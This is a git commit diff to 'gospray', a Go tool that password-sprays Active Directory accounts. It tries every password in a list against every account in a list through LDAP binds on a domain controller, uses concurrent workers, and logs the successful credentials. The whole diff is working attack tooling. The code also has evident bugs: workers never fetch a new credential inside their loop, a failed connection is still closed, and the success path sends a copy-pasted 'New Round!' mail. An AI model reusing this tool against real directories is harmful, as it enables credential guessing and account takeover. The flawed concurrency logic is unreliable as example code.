633d9ba5033ab0a2d0781418659089783685a599
wunderwuzzi23 <wunderwuzzi23@outlook.com>
2019-07-12 21:40:38 -0700

    Improvements

--- gospray.go
+++ gospray.go
@@ -2,11 +2,20 @@ package main
 
 import (
 	"bufio"
+	"crypto/tls"
+	"crypto/x509"
 	"flag"
 	"fmt"
+	"io"
+	"io/ioutil"
 	"log"
+	"net"
 	"os"
+	"strconv"
+	"sync"
+	"time"
 
+	"github.com/wunderwuzzi23/wuzziutils/mailutil"
 	ldap "gopkg.in/ldap.v3"
 )
 
@@ -15,11 +24,33 @@ type configuration struct {
 	passwordfile     string
 	domainController string
 	verbose          bool
+	dcCertificate    string
+	tlsConfig        *tls.Config
+	logfile          string
+	maxWorkers       int
 }
 
-/////////////////////////////////////////////////////////////////
-/// read a file line by line and add it to a string array
-/////////////////////////////////////////////////////////////////
+type mailConfig struct {
+	smtpServer   string
+	smtpPort     int
+	smtpAccount  string
+	smtpPassword string
+	mailFrom     string
+	mailTo       string
+}
+
+type message struct {
+	shutdown bool
+	cred     credential
+}
+
+type credential struct {
+	referenceID string
+	accountname string
+	password    string
+}
+
+// read a file line by line and add it to a string array
 func readFile(filename string) []string {
 	file, err := os.Open(filename)
 	if err != nil {
@@ -39,16 +70,16 @@ func readFile(filename string) []string {
 	return lines
 }
 
-/////////////////////////////////////////////////////////////////
-/// Main
-/////////////////////////////////////////////////////////////////
+// Main
 func main() {
 
 	fmt.Println("*******************************************************")
-	fmt.Println("*** GoSpray - Active Directory Password Testing     ***")
-	fmt.Println("*** Be aware of account lockout policies            ***")
-	fmt.Println("*** Use at your own risk                            ***")
-	fmt.Println("*** WUNDERWUZZI, July 2019, MIT License             ***")
+	fmt.Println("***                    gospray                      ***")
+	fmt.Println("***                                                 ***")
+	fmt.Println("***        Active Directory Password Testing        ***")
+	fmt.Println("***      Be aware of account lockout policies       ***")
+	fmt.Println("***              Use at your own risk               ***")
+	fmt.Println("***      WUNDERWUZZI, July 2019, MIT License        ***")
 	fmt.Println("*******************************************************")
 	fmt.Println()
 
@@ -58,44 +89,138 @@ func main() {
 	flag.StringVar(&config.passwordfile, "passwords", "passwords.list", "Password file, one password per line.")
 	flag.StringVar(&config.domainController, "dc", "ldaps://<yourdomain>.<corp>.<com>", "URL to your LDAP Server")
 	flag.BoolVar(&config.verbose, "verbose", true, "Verbose errors")
+	flag.StringVar(&config.dcCertificate, "dccert", "", "Public key from Domain Controller. To safely use TLS from non domain machine")
+	flag.StringVar(&config.logfile, "logfile", "results.log", "Log file containing results and output")
+	flag.IntVar(&config.maxWorkers, "workers", 2, "Number of concurrent worker routines")
 	flag.Parse()
 
-	fmt.Println("Configuration:")
-	fmt.Println("==============")
-	fmt.Println("Accounts File    : " + config.accountsfile)
-	fmt.Println("Passwords File   : " + config.passwordfile)
-	fmt.Println("Domain Controller: " + config.domainController)
-	//fmt.Println("Verbose Output:    " + config.verbose)
-	fmt.Println()
-	log.Println("Reading Input Files.")
-	passwords := readFile(config.passwordfile)
+	//mail configuraiton settings
+	//TODO: move this into a config file
+	mc := mailConfig{
+		"smtp-mail.outlook.com",
+		587, "", "", "", ""} //TODO: configure these for your mail account
+
+	//setup logging
+	logfile, err := os.OpenFile(config.logfile, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0666)
+	if err != nil {
+		log.Fatalf("Error creating file: %v", err)
+	}
+
+	defer logfile.Close()
+	logWriter := io.MultiWriter(os.Stdout, logfile)
+
+	//by default go log. writes to stderr, overwriting this for simple logging
+	log.SetOutput(logWriter)
+
+	log.Println("gospray -- Configuration:")
+	log.Println("=========================")
+	log.Println("Accounts File    : " + config.accountsfile)
+	log.Println("Passwords File   : " + config.passwordfile)
+	log.Println("Domain Controller: " + config.domainController)
+	//log.Println("Verbose Output:    " + config.verbose)
+	log.Println("Domain CA: " + config.dcCertificate)
+	log.Println("Workers" + strconv.Itoa(config.maxWorkers))
+	log.Println()
+
+	//Custom DC certificate to load?
+	if config.dcCertificate != "" {
+		log.Printf("Loading DC cert from local file (%s)", config.dcCertificate)
+		certs := x509.NewCertPool()
+
+		pemCA, err := ioutil.ReadFile(config.dcCertificate)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		certs.AppendCertsFromPEM(pemCA)
+
+		config.tlsConfig = &tls.Config{
+			RootCAs: certs}
+	}
+
+	log.Println("TLS configuration complete.")
+
+	log.Println("Reading Input Files for account names and passwords.")
 	accounts := readFile(config.accountsfile)
+	passwords := readFile(config.passwordfile)
+
+	log.Println("Configuring mail.")
+	mailutil.SetConfiguration(mc.smtpServer, mc.smtpPort, mc.smtpAccount, mc.smtpPassword, mc.mailFrom, mc.mailTo)
 
 	log.Println("Starting.")
-	for _, password := range passwords {
-		for _, account := range accounts {
-			validate(config, account, password)
-		}
+
+	var wg sync.WaitGroup
+	workchannel := make(chan message, config.maxWorkers)
+
+	wg.Add(config.maxWorkers)
+	for i := 0; i < config.maxWorkers; i++ {
+		go validate(&wg, workchannel, config)
 	}
+
+	for idxPwd, password := range passwords {
+
+		log.Println("***************** NEW ROUND")
+		mailutil.SendMail("New Round!", "Good luck! :)")
+
+		for idxAccount, account := range accounts {
+			var refID = strconv.Itoa(idxPwd) + "-" + strconv.Itoa(idxAccount)
+
+			cred := credential{refID, account, password}
+			m := message{false, cred}
+
+			workchannel <- m
+		}
+
+		//rest a bit after each round
+		time.Sleep(10 * time.Second)
+	}
+
+	//cleanup
+	for i := 0; i < config.maxWorkers; i++ {
+		m := message{true, credential{}}
+		workchannel <- m
+	}
+
 	log.Printf("Done.")
 }
 
-func validate(config configuration, accountname string, password string) {
-	connection, err := ldap.DialURL(config.domainController)
-	if err != nil {
-		log.Fatalf("Error connecting to domain: %s", err)
-	}
-	defer connection.Close()
+func validate(wg *sync.WaitGroup, m <-chan message, config configuration) {
+	defer wg.Done()
 
-	//Validate the credentials
-	fmt.Printf("%s::%s::", accountname, password)
-	err = connection.Bind(accountname, password)
-	if err != nil {
-		fmt.Println("Failed")
-		if config.verbose {
-			fmt.Println(err)
+	work := <-m
+
+	for !work.shutdown {
+
+		cred := work.cred
+
+		connection, err := ldap.DialTLS("tcp", net.JoinHostPort(config.domainController, ldap.DefaultLdapsPort), config.tlsConfig)
+		if err == nil {
+
+			//bind to validate the credential
+			//noticed that this seems to prefer a upn as accountname (not just alias/samAccountName)
+			//so be aware to have the input file for accounts in account@domain.com form
+			//test this first in your environment
+			err = connection.Bind(cred.accountname, cred.password)
+			if err != nil {
+				log.Printf("%s -- %s::%s::Failed.", cred.referenceID, cred.accountname, cred.password)
+
+				if config.verbose {
+					fmt.Println(err)
+				}
+			} else {
+				mailutil.SendMail("New Round!", "Good luck! :)")
+				log.Printf("%s -- %s::%s::Succes.", cred.referenceID, cred.accountname, cred.password)
+			}
+
+		} else {
+			log.Printf("Error connecting to domain: %s", err)
 		}
-	} else {
-		fmt.Println("Success")
+
+		connection.Close()
+		//sleep a little to back off
+		time.Sleep(100 * time.Millisecond)
 	}
+
+	//wait for next message
+	work = <-m
 }
